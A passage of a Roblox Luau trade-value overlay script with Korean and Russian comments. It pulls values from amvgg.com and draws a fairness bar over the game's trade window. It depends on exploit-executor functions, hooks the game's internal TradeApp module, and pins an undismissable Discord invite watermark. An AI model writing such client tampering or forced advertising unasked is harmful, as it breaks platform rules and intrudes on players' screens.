			local nStr, unit = ago:match("^(%w+)%s+(%a+)")
			local n = tonumber(nStr) or ((nStr == "a" or nStr == "an") and 1) or nil
			unit = unit and unit:lower():gsub("s$", "")
			if n and unit and UNIT_SECS[unit] then stamp = now - n * UNIT_SECS[unit] end
		elseif text:find("Last updated:?%s*[Jj]ust now") then
			stamp = now
		end
		if not stamp and not TREND.dbgPage then
			TREND.dbgPage = true
			dbg("PAGE no stamp: " .. url .. " :: " .. (text:match("Last updated.-$") or "?"):sub(1, 200))
		end
	end
	TREND.stamp[job.key] = stamp
	if stamp then TREND.cache[job.key] = { s = stamp, f = now } end
end

function TREND.saveCache()
	pcall(function() if writefile then writefile(TREND.CACHE_FILE, HttpService:JSONEncode(TREND.cache)) end end)
end

function TREND.want(key, name)
	if TREND.queued[key] or not name then return end
	TREND.queued[key] = true
	table.insert(TREND.queue, { key = key, name = name })
	if TREND.worker then return end
	TREND.worker = true
	task.spawn(function()
		local fetched = 0
		while true do
			local job = table.remove(TREND.queue, 1)
			if job then
				pcall(TREND.fetchPage, job)
				fetched += 1
				if fetched % 8 == 0 then
					if HOOKS.refresh then task.defer(HOOKS.refresh) end
					TREND.saveCache()
				end
				task.wait(0.25)
			else
				if fetched % 8 ~= 0 then
					fetched = 0
					if HOOKS.refresh then task.defer(HOOKS.refresh) end
					TREND.saveCache()
				end
				task.wait(0.5)
			end
		end
	end)
end

-- dir("up"/"down"/"changed"/"stable")와 경과 시간(초)을 반환 — 사이트 데이터만 사용
function TREND.get(key, name, category)
	if not key then return nil end
	local now = os.time()
	local stamp = TREND.stamp[key]
	if stamp == nil then
		local c = TREND.cache[key]
		if c and now - c.f < 10800 then stamp = c.s; TREND.stamp[key] = stamp end
	end
	if stamp == nil then
		if category == "pets" then TREND.want(key, name) end
		return nil
	end
	if stamp == false then return nil end
	local age = math.max(0, now - stamp)
	local dir = TREND.dir[key]
	local l = TREND.localRec[key]
	if not dir and l and l.dir then dir = l.dir end
	if dir and age > TREND.WINDOW_DAYS * 86400 then dir = nil end
	if not dir then dir = (age < 86400) and "changed" or "stable" end
	return dir, age
end

function TREND.ageText(age)
	local h = age / 3600
	if h < 24 then return math.max(1, math.floor(h)) .. "시간" end
	local d = age / 86400
	if d < 7 then return math.floor(d) .. "일" end
	if d < 30 then return math.floor(d / 7) .. "주" end
	return math.floor(d / 30) .. "개월"
end

-- RichText와 일반 텍스트를 반환 (너비 측정용)
function TREND.format(dir, age)
	local r, g, b, arrow
	if dir == "up" then r, g, b, arrow = 90, 225, 120, "▲"
	elseif dir == "down" then r, g, b, arrow = 245, 85, 85, "▼"
	elseif dir == "changed" then r, g, b, arrow = 235, 225, 110, "◆"
	else
		arrow = "▶"
		if age >= TREND.STABLE_OLD_DAYS * 86400 then r, g, b = 160, 160, 160 else r, g, b = 255, 165, 40 end
	end
	local word = (dir == "up" and "상승") or (dir == "down" and "하락") or (dir == "changed" and "변경") or "안정"
	local txt = arrow .. TREND.ageText(age)
	return string.format('<font color="rgb(%d,%d,%d)">%s</font>', r, g, b, txt), txt
end

function TREND.load()
	pcall(function()
		if isfile and readfile and isfile(TREND.CACHE_FILE) then TREND.cache = HttpService:JSONDecode(readfile(TREND.CACHE_FILE)) end
	end)
	pcall(TREND.harvestStamps)
	pcall(TREND.trackLocal)
	pcall(TREND.fetchTrending)
	if TREND.started then return end
	TREND.started = true
	task.spawn(function()
		while true do
			task.wait(TREND.REFRESH_EVERY)
			pcall(TREND.fetchTrending)
			if HOOKS.refresh then task.defer(HOOKS.refresh) end
		end
	end)
end

local SOURCES = {
	{ label = "pets",      url = "https://amvgg.com/values/pets",      key = "pets"  },
	{ label = "eggs",      url = "https://amvgg.com/values/eggs",      key = "items" },
	{ label = "petwear",   url = "https://amvgg.com/values/petwear",   key = "items" },
	{ label = "strollers", url = "https://amvgg.com/values/strollers", key = "items" },
	{ label = "food",      url = "https://amvgg.com/values/food",      key = "items" },
	{ label = "vehicles",  url = "https://amvgg.com/values/vehicles",  key = "items" },
	{ label = "toys",      url = "https://amvgg.com/values/toys",      key = "items" },
	{ label = "gifts",     url = "https://amvgg.com/values/gifts",     key = "items" },
	{ label = "stickers",  url = "https://amvgg.com/values/stickers",  key = "items" },
}

task.spawn(function()
	for _, src in ipairs(SOURCES) do
		local list = httpGetArray(src.url, src.key)
		if list then
			local n = 0
			if src.key == "pets" then
				for _, p in ipairs(list) do
					local name = trim(p.name)
					if name then
						amvggPetsByExact[name] = p; amvggPetsByLower[name:lower()] = p; n += 1
					end
				end
				MODE.Demand.calibrate(list)
				print("[amvgg] Demand scale: " .. tostring(MODE.Demand.scale))
			else
				for _, item in ipairs(list) do registerItem(item); n += 1 end
			end
			print("[amvgg] Loaded " .. n .. " " .. src.label)
		else
			warn("[amvgg] Failed to load " .. src.label)
		end
		task.wait(0)
	end
	rebuildKindValueMap()
	local total = 0
	for _ in pairs(kindValueMap) do total += 1 end
	local demandTotal = 0
	for _ in pairs(amvggDemandByExact) do demandTotal += 1 end
	print("[amvgg] Mapped " .. total .. " inventory kinds to amvgg values")
	print("[amvgg] Loaded demand for " .. demandTotal .. " items")
	if demandTotal == 0 then
		warn("[amvgg] Demand fields were not found in the downloaded data; check the AMVGG page format")
	end
	task.defer(function() if BackpackApp then BackpackApp:refresh_rendered_items() end end)
	TREND.load()
	if HOOKS.refresh then task.defer(HOOKS.refresh) end
end)

rebuildKindValueMap()

local function computeRawValue(id, props, category, offerItem)
	if category and category ~= "pets" then
		local hit = findValueEntry(id, category, offerItem)
		if hit then return tonumber(hit.value) or 0 end
	end
	local pet = findPetEntry(id)
	if not pet then
		local hit = findValueEntry(id, category, offerItem)
		if hit then return tonumber(hit.value) or 0 end
		return 0
	end
	local suffix = petSuffix(props or {})
	local v = getPetPrice(pet, suffix) or 0
	if v == 0 and (suffix == "r" or suffix == "nr") then
		local altV = getPetPrice(pet, suffix:gsub("r", "f")) or 0
		if altV > 0 then return altV end
	end
	if v == 0 then
		for _, s in ipairs({ "fr","f","r","nfr","nf","nr","mfr","mf","mr" }) do
			local p = getPetPrice(pet, s) or 0
			if p > 0 then return p end
		end
	end
	return v
end

local function val(id, props, category, offerItem)
	local raw = computeRawValue(id, props, category, offerItem)
	if MODE.current == "ridepot" then return ridepotConvert(raw) end
	if MODE.current == "frost"   then return frostConvert(raw)    end
	return raw
end

--==================================================================
-- 거래 제안 읽기
--==================================================================
local function safeOffer(getter)
	local ok, res = pcall(getter)
	if ok and type(res) == "table" and type(res.items) == "table" then return res end
	return nil
end

local function itemsFromOffer(offer)
	if not offer or type(offer.items) ~= "table" then return {}, 0 end
	local out, total = {}, 0
	for _, item in ipairs(offer.items) do
		local kind = resolveKind(item)
		local v    = val(kind, item.properties, item.category, item)
		total += v
		local stars = nil
		if item.category == "pets" then
			local pe = findPetEntry(kind)
			stars = pe and MODE.Demand.stars(pe) or nil
		end
		table.insert(out, { name = kind or item.kind or "?", value = v, props = item.properties, category = item.category, stars = stars })
	end
	return out, total
end

local function myOffer() return itemsFromOffer(safeOffer(function() return TradeApp:_get_my_offer() end)) end
local function partnerOffer() return itemsFromOffer(safeOffer(function() return TradeApp:_get_partner_offer() end)) end

local function formatValue(x)
	if x == 0 then return "0" end
	if x >= 1000 then return string.format("%.1fk", x / 1000) end
	if x >= 100   then return string.format("%.0f", x) end
	return (string.format("%.4f", x):gsub("%.?0+$", ""))
end

MODE.SetMode = function(name)
	for _, m in ipairs(MODE.order) do if m == name then MODE.current = name; return true end end
	return false
end
MODE.GetItemsFromOffer = itemsFromOffer
MODE.GetItemsFromMyOffer = myOffer
MODE.GetItemsFromPartnerOffer = partnerOffer
MODE.FormatValue = formatValue
MODE.val = val

--==================================================================
-- UI #1: WIN/FAIR/LOSE 막대 (애니메이션 포함)
--==================================================================
local LocalPlayer = Players.LocalPlayer
local SHOW_CURRENCY = true
local SHOW_DEMAND = true
local SHOW_TREND = true
local refreshAllLabels -- forward declaration

-- 애니메이션 유틸리티
local UI = {}
function UI.tween(obj, t, props, style, dir)
	local tw = TweenService:Create(obj, TweenInfo.new(t, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out), props)
	tw:Play(); return tw
end
function UI.round(obj, r)
	local c = Instance.new("UICorner"); c.CornerRadius = r; c.Parent = obj
end
function UI.scale(obj)
	local s = obj:FindFirstChildOfClass("UIScale")
	if not s then s = Instance.new("UIScale"); s.Parent = obj end
	return s
end
function UI.pop(obj, from)
	local s = UI.scale(obj); s.Scale = from or 0.9
	UI.tween(s, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)
end
function UI.bindPress(btn)
	local s = UI.scale(btn)
	btn.MouseButton1Down:Connect(function() UI.tween(s, 0.08, { Scale = 0.93 }, Enum.EasingStyle.Quad) end)
	local function release() UI.tween(s, 0.35, { Scale = 1 }, Enum.EasingStyle.Back) end
	btn.MouseButton1Up:Connect(release); btn.MouseLeave:Connect(release)
end
function UI.counter(apply, t)
	local nv = Instance.new("NumberValue")
	nv.Changed:Connect(apply)
	return function(target)
		UI.tween(nv, t or 0.4, { Value = target })
	end, nv
end

local FRAME_FULL_H, FRAME_COMPACT_H, PANEL_H = 228, 176, 48

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false; ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 1000
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui"); ScreenGui.Enabled = true

-- Discord 워터마크: 거래 창 바로 위에 표시
local WATERMARK_URL = "https://raw.githubusercontent.com/naa581663-bot/assqsdqwdwrqer/36d7b6ece724d2f41887a3c4d52714e35384db2e/143F54E9-38B2-4066-92ED-269FB295495D.png"

-- Отдельный ScreenGui: ватермарка не зависит от видимости основного оверлея
local WatermarkGui = Instance.new("ScreenGui")
WatermarkGui.Name = "AlwaysVisibleTradeWatermark"
WatermarkGui.ResetOnSpawn = false
WatermarkGui.IgnoreGuiInset = true
WatermarkGui.DisplayOrder = 2000
WatermarkGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
WatermarkGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local watermark = Instance.new("ImageLabel")
watermark.Name = "DiscordTradeWatermark"
watermark.AnchorPoint = Vector2.new(0.5, 1)
watermark.Size = UDim2.fromOffset(440, 78)
watermark.Position = UDim2.new(0.5, 0, 1, -24)
watermark.BackgroundTransparency = 1
watermark.BorderSizePixel = 0
watermark.Image = ""
watermark.ScaleType = Enum.ScaleType.Fit
watermark.ZIndex = 100
-- Зафиксировано: водяной знак нельзя выбрать или перетаскивать
watermark.Active = false
watermark.Selectable = false
watermark.Visible = true
watermark.Parent = WatermarkGui

-- Сразу показываем текстовую версию, пока загружается исходная картинка
local watermarkFallback = Instance.new("TextLabel")
watermarkFallback.Name = "WatermarkFallback"
watermarkFallback.Size = UDim2.fromScale(1, 1)
watermarkFallback.BackgroundTransparency = 1
watermarkFallback.Text = "디스코드 채널의 화폐\nhttps://discord.gg/B9YsRqtpG"
watermarkFallback.TextColor3 = Color3.fromRGB(255, 255, 255)
watermarkFallback.TextScaled = true
watermarkFallback.Visible = false
watermarkFallback.Font = Enum.Font.GothamBold
watermarkFallback.ZIndex = 101
-- Текстовая подложка тоже не принимает ввод
watermarkFallback.Active = false
watermarkFallback.Selectable = false
watermarkFallback.Parent = watermark

-- Встроенный обрезанный PNG: не требуется загружать отдельную картинку по URL
-- Новая ватермарка загружается по указанной PNG-ссылке.
-- Картинка сохраняется локально и подключается как custom asset.
task.spawn(function()
    local ok, err = pcall(function()
        local assetGetter = getcustomasset or getsynasset
        if type(request) ~= "function" or type(writefile) ~= "function" or type(assetGetter) ~= "function" then
            watermarkFallback.Visible = true
            return
        end

        local response = request({
            Url = WATERMARK_URL,
            Method = "GET",
            Headers = { Accept = "image/png" }
        })

        if not response or not response.Success or type(response.Body) ~= "string" or #response.Body == 0 then
            watermarkFallback.Visible = true
            return
        end

        local fileName = "trade_watermark_new.png"
        writefile(fileName, response.Body)
        local assetId = assetGetter(fileName)

        if type(assetId) == "string" and assetId ~= "" then
            watermark.Image = assetId
            watermark.ScaleType = Enum.ScaleType.Crop
            watermarkFallback.Visible = false
        else
            watermarkFallback.Visible = true
        end
    end)

    if not ok then
        warn("[watermark] Не удалось загрузить новую картинку: " .. tostring(err))
        watermarkFallback.Visible = true
    end
end)

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"; Frame.AnchorPoint = Vector2.new(0.5, 0); Frame.Position = UDim2.new(0.5, 0, 0.05, 0)
Frame.Size = UDim2.new(0, 480, 0, FRAME_FULL_H); Frame.BackgroundColor3 = Color3.fromRGB(150, 150, 150); Frame.BorderSizePixel = 0; Frame.Active = true; Frame.Parent = ScreenGui
UI.round(Frame, UDim.new(0, 14))

local dragging, dragStart, startPos = false, nil, nil
Frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true; dragStart = input.Position; startPos = Frame.Position
		input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- 슬라이딩 표시기가 있는 모드 탭
local BTN_W, BTN_GAP = 148, 4
local modeRow = Instance.new("Frame")
modeRow.Name = "ModeRow"; modeRow.BackgroundTransparency = 1; modeRow.Position = UDim2.new(0, 8, 0, 6); modeRow.Size = UDim2.new(1, -16, 0, 28); modeRow.Parent = Frame

local modeIndicator = Instance.new("Frame")
modeIndicator.Name = "Indicator"; modeIndicator.Size = UDim2.new(0, BTN_W, 1, 0); modeIndicator.BackgroundColor3 = Color3.fromRGB(60, 120, 220)
modeIndicator.BorderSizePixel = 0; modeIndicator.ZIndex = 2; modeIndicator.Parent = modeRow
UI.round(modeIndicator, UDim.new(0, 8))

local modeButtons = {}
local refreshResult

local function refreshModeButtons(animate)
	for key, e in pairs(modeButtons) do
		local sel = key == MODE.current
		local col = sel and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(170, 170, 170)
		if animate then UI.tween(e.btn, 0.25, { TextColor3 = col }) else e.btn.TextColor3 = col end
		if sel then
			local pos = UDim2.new(0, e.x, 0, 0)
			if animate then UI.tween(modeIndicator, 0.4, { Position = pos }, Enum.EasingStyle.Back) else modeIndicator.Position = pos end
		end
	end
end

for i, modeKey in ipairs(MODE.order) do
	local x = (i - 1) * (BTN_W + BTN_GAP)
	local track = Instance.new("Frame")
	track.Name = "Track_" .. modeKey; track.Position = UDim2.new(0, x, 0, 0); track.Size = UDim2.new(0, BTN_W, 1, 0)
	track.BackgroundColor3 = Color3.fromRGB(55, 55, 62); track.BorderSizePixel = 0; track.ZIndex = 1; track.Parent = modeRow
	UI.round(track, UDim.new(0, 8))

	local btn = Instance.new("TextButton")
	btn.Name = "ModeTab_" .. modeKey; btn.Position = UDim2.new(0, x, 0, 0); btn.Size = UDim2.new(0, BTN_W, 1, 0)
	btn.BackgroundTransparency = 1; btn.AutoButtonColor = false; btn.ZIndex = 3
	btn.Text = MODE.labels[modeKey] or modeKey; btn.Font = Enum.Font.GothamBold; btn.TextSize = 14; btn.BorderSizePixel = 0; btn.Parent = modeRow
	UI.bindPress(btn)
	btn.MouseButton1Click:Connect(function()
		if MODE.current == modeKey then return end
		if MODE.SetMode(modeKey) then
			refreshModeButtons(true); refreshResult()
			task.defer(function() if BackpackApp then BackpackApp:refresh_rendered_items() end end)
			if HOOKS.scanTrade then task.defer(HOOKS.scanTrade) end
		end
	end)
	modeButtons[modeKey] = { btn = btn, x = x }
end
refreshModeButtons(false)

-- 가치 / 수요도 / 추세 표시 전환 버튼
local toggleRow = Instance.new("Frame")
toggleRow.Name = "ToggleRow"; toggleRow.BackgroundTransparency = 1
toggleRow.Position = UDim2.new(0, 8, 0, 38); toggleRow.Size = UDim2.new(1, -16, 0, 28); toggleRow.Parent = Frame

local ON_COLOR, OFF_COLOR = Color3.fromRGB(45, 174, 96), Color3.fromRGB(65, 65, 73)
local toggleButtons = {}
local setDemandPanelVisible -- forward

local function makeToggle(name, label, enabled, order, onChange)
	local btn = Instance.new("TextButton")
	btn.Name = name; btn.Position = UDim2.new(0, (order - 1) * (BTN_W + BTN_GAP), 0, 0); btn.Size = UDim2.new(0, BTN_W, 1, 0)
	btn.AutoButtonColor = false; btn.BorderSizePixel = 0
	btn.Font = Enum.Font.GothamBold; btn.TextSize = 12; btn.TextColor3 = Color3.fromRGB(235, 235, 235)
	btn.Parent = toggleRow
	UI.round(btn, UDim.new(0, 8))
	UI.bindPress(btn)
	local state = enabled
	local function paint(animate)
		local col = state and ON_COLOR or OFF_COLOR
		local txt = label .. (state and ": 켜짐" or ": 꺼짐")
		if animate then
			UI.tween(btn, 0.35, { BackgroundColor3 = col })
			UI.tween(btn, 0.1, { TextTransparency = 1 })
			task.delay(0.1, function() btn.Text = txt; UI.tween(btn, 0.18, { TextTransparency = 0 }) end)
		else
			btn.BackgroundColor3 = col; btn.Text = txt
		end
	end
	paint(false)
	btn.MouseButton1Click:Connect(function()
		state = not state
		paint(true)
		onChange(state)
	end)
	toggleButtons[name] = btn
	return btn
end
makeToggle("CurrencyToggle", "가치", SHOW_CURRENCY, 1, function(s)
	SHOW_CURRENCY = s; if HOOKS.relayout then HOOKS.relayout() end
end)
makeToggle("DemandToggle", "수요도", SHOW_DEMAND, 2, function(s)
	SHOW_DEMAND = s; setDemandPanelVisible(s); if HOOKS.relayout then HOOKS.relayout() end
end)
makeToggle("RefreshToggle", "추세", SHOW_TREND, 3, function(s)
	SHOW_TREND = s; if HOOKS.relayout then HOOKS.relayout() end
end)

local resultLabel = Instance.new("TextLabel")
resultLabel.Name = "ResultLabel"; resultLabel.BackgroundTransparency = 1; resultLabel.Position = UDim2.new(0, 0, 0, 70); resultLabel.Size = UDim2.new(1, 0, 0, 40)
resultLabel.Text = "손해"; resultLabel.TextColor3 = Color3.fromRGB(40, 40, 40); resultLabel.Font = Enum.Font.GothamBlack; resultLabel.TextScaled = true; resultLabel.Parent = Frame

local barFrame = Instance.new("Frame")
barFrame.Name = "BarContainer"; barFrame.Position = UDim2.new(0, 8, 0, 112); barFrame.Size = UDim2.new(1, -16, 0, 56)
barFrame.BackgroundColor3 = Color3.fromRGB(231, 76, 60); barFrame.BorderSizePixel = 0; barFrame.ClipsDescendants = true; barFrame.Parent = Frame
UI.round(barFrame, UDim.new(0, 12))
do local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(20, 20, 20); st.Thickness = 2; st.Parent = barFrame end

local barFill = Instance.new("Frame")
barFill.Name = "BarFill"; barFill.Size = UDim2.new(0.5, 0, 1, 0); barFill.BackgroundColor3 = Color3.fromRGB(192, 57, 43); barFill.BorderSizePixel = 0; barFill.Parent = barFrame
UI.round(barFill, UDim.new(0, 12))

local leftLabel = Instance.new("TextLabel")
leftLabel.Name = "LeftValue"; leftLabel.BackgroundTransparency = 1; leftLabel.Position = UDim2.new(0, 14, 0, 0); leftLabel.Size = UDim2.new(0, 100, 1, 0)
leftLabel.Text = "0.00"; leftLabel.TextColor3 = Color3.fromRGB(255, 255, 255); leftLabel.Font = Enum.Font.GothamBlack; leftLabel.TextScaled = true; leftLabel.TextXAlignment = Enum.TextXAlignment.Left; leftLabel.ZIndex = 3; leftLabel.Parent = barFrame

local rightLabel = Instance.new("TextLabel")
rightLabel.Name = "RightValue"; rightLabel.BackgroundTransparency = 1; rightLabel.Position = UDim2.new(1, -90, 0, 0); rightLabel.Size = UDim2.new(0, 76, 1, 0)
rightLabel.Text = "0.00"; rightLabel.TextColor3 = Color3.fromRGB(255, 255, 255); rightLabel.Font = Enum.Font.GothamBlack; rightLabel.TextScaled = true; rightLabel.TextXAlignment = Enum.TextXAlignment.Right; rightLabel.ZIndex = 3; rightLabel.Parent = barFrame

local diffLabel = Instance.new("TextLabel")
diffLabel.Name = "DiffLabel"; diffLabel.AnchorPoint = Vector2.new(0.5, 0.5); diffLabel.Position = UDim2.new(0.5, 0, 0.5, 0); diffLabel.Size = UDim2.new(0, 90, 0, 26)
diffLabel.BackgroundColor3 = Color3.fromRGB(192, 57, 43); diffLabel.BackgroundTransparency = 0.15; diffLabel.Text = "0.00"; diffLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
diffLabel.Font = Enum.Font.GothamBold; diffLabel.TextScaled = true; diffLabel.ZIndex = 3; diffLabel.Parent = barFrame
UI.round(diffLabel, UDim.new(1, 0))

-- 수요도 패널 (클립 컨테이너 안에서 부드럽게 접히도록 처리)
local demandClip = Instance.new("Frame")
demandClip.Name = "DemandClip"; demandClip.BackgroundTransparency = 1; demandClip.ClipsDescendants = true
demandClip.Position = UDim2.new(0, 8, 0, 174); demandClip.Size = UDim2.new(1, -16, 0, PANEL_H); demandClip.Parent = Frame

local demandPanel = Instance.new("Frame")
demandPanel.Name = "DemandPanel"; demandPanel.Position = UDim2.new(0, 0, 0, 0)
demandPanel.Size = UDim2.new(1, 0, 0, PANEL_H); demandPanel.BackgroundColor3 = Color3.fromRGB(43, 43, 49)
demandPanel.BorderSizePixel = 0; demandPanel.Parent = demandClip
UI.round(demandPanel, UDim.new(0, 12))
local demandTitle = Instance.new("TextLabel")
demandTitle.Name = "DemandTitle"; demandTitle.BackgroundTransparency = 1
demandTitle.Position = UDim2.new(0, 0, 0, 2); demandTitle.Size = UDim2.new(1, 0, 0, 16)
demandTitle.Text = "수요도"; demandTitle.TextColor3 = Color3.fromRGB(230, 230, 230)
demandTitle.Font = Enum.Font.GothamBold; demandTitle.TextSize = 12; demandTitle.Parent = demandPanel
local myDemandLabel = Instance.new("TextLabel")
myDemandLabel.Name = "MyDemand"; myDemandLabel.BackgroundTransparency = 1; myDemandLabel.RichText = true
myDemandLabel.Position = UDim2.new(0, 10, 0, 20); myDemandLabel.Size = UDim2.new(0.48, -10, 0, 23)
myDemandLabel.Text = ""; myDemandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
myDemandLabel.Font = Enum.Font.GothamBold; myDemandLabel.TextSize = 13
myDemandLabel.TextXAlignment = Enum.TextXAlignment.Left; myDemandLabel.Parent = demandPanel
local partnerDemandLabel = Instance.new("TextLabel")
partnerDemandLabel.Name = "PartnerDemand"; partnerDemandLabel.BackgroundTransparency = 1; partnerDemandLabel.RichText = true
partnerDemandLabel.Position = UDim2.new(0.50, 0, 0, 20); partnerDemandLabel.Size = UDim2.new(0.48, -10, 0, 23)
partnerDemandLabel.Text = ""; partnerDemandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
partnerDemandLabel.Font = Enum.Font.GothamBold; partnerDemandLabel.TextSize = 13
partnerDemandLabel.TextXAlignment = Enum.TextXAlignment.Right; partnerDemandLabel.Parent = demandPanel

setDemandPanelVisible = function(show, instant)
	local fullSize, clipFull = UDim2.new(0, 480, 0, FRAME_FULL_H), UDim2.new(1, -16, 0, PANEL_H)
	local compact, clipShut = UDim2.new(0, 480, 0, FRAME_COMPACT_H), UDim2.new(1, -16, 0, 0)
	local panelHome, panelAway = UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, -PANEL_H - 6)
	if show then
		demandClip.Visible = true
		if instant then Frame.Size = fullSize; demandClip.Size = clipFull; demandPanel.Position = panelHome; return end
		UI.tween(Frame, 0.5, { Size = fullSize }, Enum.EasingStyle.Back)
		UI.tween(demandClip, 0.5, { Size = clipFull }, Enum.EasingStyle.Back)
		UI.tween(demandPanel, 0.55, { Position = panelHome }, Enum.EasingStyle.Back)
	else
		if instant then Frame.Size = compact; demandClip.Size = clipShut; demandPanel.Position = panelAway; demandClip.Visible = false; return end
		UI.tween(Frame, 0.4, { Size = compact }, Enum.EasingStyle.Quart)
		UI.tween(demandClip, 0.4, { Size = clipShut }, Enum.EasingStyle.Quart)
		UI.tween(demandPanel, 0.4, { Position = panelAway }, Enum.EasingStyle.Quart)
		task.delay(0.45, function() if not SHOW_DEMAND then demandClip.Visible = false end end)
	end
end
setDemandPanelVisible(SHOW_DEMAND, true)

-- 막대의 숫자 (부드러운 카운터 애니메이션)
local curMy, curPrt = 0, 0
local function renderNumbers()
	leftLabel.Text = string.format("%.2f", curMy); rightLabel.Text = string.format("%.2f", curPrt)
	local diff = curMy - curPrt
	diffLabel.Text = (diff >= 0 and "+" or "") .. string.format("%.2f", diff)
end
local lastMyT, lastPrtT = nil, nil
renderNumbers()

-- 수요도 (제안에 포함된 펫 별점의 평균)
local GREY_STARS = '<font color="rgb(110,110,110)">★★★</font>'
local function starsRich(avg)
	local n = math.clamp(math.floor(avg + 0.5), 0, 3)
	return string.format('<font color="rgb(255,200,40)">%s</font><font color="rgb(110,110,110)">%s</font>', string.rep("★", n), string.rep("★", 3 - n))
end
local hasMyD, hasPrtD, curMyD, curPrtD = false, false, 0, 0
local function renderDemand()
	myDemandLabel.Text = hasMyD and string.format("내 제안: %.1f %s", curMyD, starsRich(curMyD)) or ("내 제안: — " .. GREY_STARS)
	partnerDemandLabel.Text = hasPrtD and string.format("상대방: %.1f %s", curPrtD, starsRich(curPrtD)) or ("상대방: — " .. GREY_STARS)
end
local setMyD, myDNV = UI.counter(function(v) curMyD = v; renderDemand() end, 0.35)
local setPrtD, prtDNV = UI.counter(function(v) curPrtD = v; renderDemand() end, 0.35)
renderDemand()

local function setDemandSide(side, avg)
	if side == "my" then
		if avg then
			if not hasMyD then hasMyD = true; myDNV.Value = avg else setMyD(avg) end
		elseif hasMyD then hasMyD = false; renderDemand() end
	else
		if avg then
			if not hasPrtD then hasPrtD = true; prtDNV.Value = avg else setPrtD(avg) end
		elseif hasPrtD then hasPrtD = false; renderDemand() end
	end
end

local CATEGORIES = {
	{ max = 0.45, label = "이득",       bg = Color3.fromRGB(39, 174, 96),  fill = Color3.fromRGB(30, 150, 80) },
	{ max = 0.49, label = "소폭 이득", bg = Color3.fromRGB(88, 214, 141), fill = Color3.fromRGB(60, 190, 110) },
	{ max = 0.51, label = "공정",      bg = Color3.fromRGB(155, 89, 182), fill = Color3.fromRGB(130, 60, 160) },
	{ max = 0.55, label = "소폭 손해", bg = Color3.fromRGB(230, 126, 34), fill = Color3.fromRGB(200, 100, 20) },
	{ max = 1.01, label = "손해",      bg = Color3.fromRGB(231, 76, 60),  fill = Color3.fromRGB(192, 57, 43) },
}

local function setCategory(ratio)
	local chosen = CATEGORIES[#CATEGORIES]
	for _, c in ipairs(CATEGORIES) do if ratio < c.max then chosen = c; break end end
	if resultLabel.Text ~= chosen.label then resultLabel.Text = chosen.label; UI.pop(resultLabel, 0.8) end
	UI.tween(barFrame, 0.4, { BackgroundColor3 = chosen.bg })
	UI.tween(barFill, 0.4, { BackgroundColor3 = chosen.fill })
	UI.tween(diffLabel, 0.4, { BackgroundColor3 = chosen.fill })
end
local function setFillRatio(r)
	UI.tween(barFill, 0.45, { Size = UDim2.new(math.clamp(r, 0, 1), 0, 1, 0) })
end

local function updateBar(myValue, partnerValue)
	local my, prt = myValue or 0, partnerValue or 0
	if my ~= lastMyT or prt ~= lastPrtT then
		lastMyT, lastPrtT = my, prt
		curMy, curPrt = my, prt
		renderNumbers()
	end
	local sum = my + prt
	if sum <= 0 then setCategory(0.5); setFillRatio(0.5); return end
	local ratio = my / sum; setCategory(ratio); setFillRatio(ratio)
end

local function avgStars(list)
	local s, n = 0, 0
	for _, it in ipairs(list or {}) do
		if it.stars then s += it.stars; n += 1 end
	end
	if n == 0 then return nil end
	return s / n
end

local function refresh()
	local ok, myList, my, prtList, prt = pcall(function()
		local a, av = MODE.GetItemsFromMyOffer(); local b, bv = MODE.GetItemsFromPartnerOffer(); return a, av, b, bv
	end)
	if not ok then myList, my, prtList, prt = {}, 0, {}, 0 end
	updateBar(my or 0, prt or 0)
	setDemandSide("my", avgStars(myList)); setDemandSide("prt", avgStars(prtList))
	return my or 0, prt or 0
end
refreshResult = function() refresh() end
updateBar(0, 0)

-- 거래 창을 열 때 부드럽게 나타나는 효과
local function playIntro()
	if dragging then return end
	local target = Frame.Position
	local sc = UI.scale(Frame)
	sc.Scale = 0.85
	Frame.Position = target - UDim2.new(0, 0, 0, 30)
	UI.tween(sc, 0.55, { Scale = 1 }, Enum.EasingStyle.Back)
	UI.tween(Frame, 0.55, { Position = target }, Enum.EasingStyle.Back)
	for i, obj in ipairs({ modeRow, toggleRow, barFrame, demandClip }) do
		local s = UI.scale(obj); s.Scale = 0.85
		task.delay(0.07 * i, function() UI.tween(s, 0.45, { Scale = 1 }, Enum.EasingStyle.Back) end)
	end
end

task.spawn(function()
	local wasVisible = false
	while true do
		local tradeFrame
		local visible = false
		pcall(function()
			tradeFrame = TradeApp.instance.Frame
			visible = tradeFrame.Visible == true
		end)

		if visible and tradeFrame then
			-- Когда трейд открыт, держим ватермарку прямо над его окном
			local pos = tradeFrame.AbsolutePosition
			local size = tradeFrame.AbsoluteSize
			watermark.Position = UDim2.fromOffset(
				pos.X + size.X / 2,
				math.max(191, pos.Y + 89)
			)
		else
			-- Когда трейд закрыт, ватермарка остаётся на экране
			local camera = workspace.CurrentCamera
			local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
			watermark.Position = UDim2.fromOffset(viewport.X / 2, math.max(191, viewport.Y * 0.28 + 65))
		end

		watermark.Visible = true
		WatermarkGui.Enabled = true
		if visible and not wasVisible then playIntro() end
		wasVisible = visible
		ScreenGui.Enabled = visible
		task.wait(0.05)
	end
end)

local originalRefresh = TradeApp.refresh_all
TradeApp.refresh_all = function(...)
